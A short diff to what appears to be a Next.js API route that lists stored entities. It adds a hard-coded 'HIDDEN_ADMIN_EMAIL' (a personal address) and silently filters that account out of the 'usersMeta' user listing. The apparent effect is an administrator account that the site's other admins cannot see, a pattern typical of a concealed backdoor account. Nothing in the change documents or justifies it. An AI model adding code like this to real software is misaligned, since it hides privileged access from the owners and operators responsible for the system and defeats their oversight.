@@ -5,6 +5,7 @@ import { dataPartitionKey, dataSortKey, isDataEntity } from "../../../lib/dataEn
 
 export const runtime = "nodejs";
 export const dynamic = "force-dynamic";
+const HIDDEN_ADMIN_EMAIL = "01devmanish@gmail.com";
 
 type Row = Record<string, unknown> & { id?: string };
 
@@ -85,6 +86,14 @@ export async function GET(
 
       lastKey = result.LastEvaluatedKey as Record<string, unknown> | undefined;
     } while (lastKey);
+
+    if (entity === "usersMeta") {
+      const filtered = rows.filter((row) => {
+        const email = String((row as Record<string, unknown>)?.email || "").trim().toLowerCase();
+        return email !== HIDDEN_ADMIN_EMAIL;
+      });
+      return NextResponse.json({ items: filtered });
+    }
 
     if (entity === "tasks") {
       const assignedTo = req.nextUrl.searchParams.get("assignedTo")?.trim();
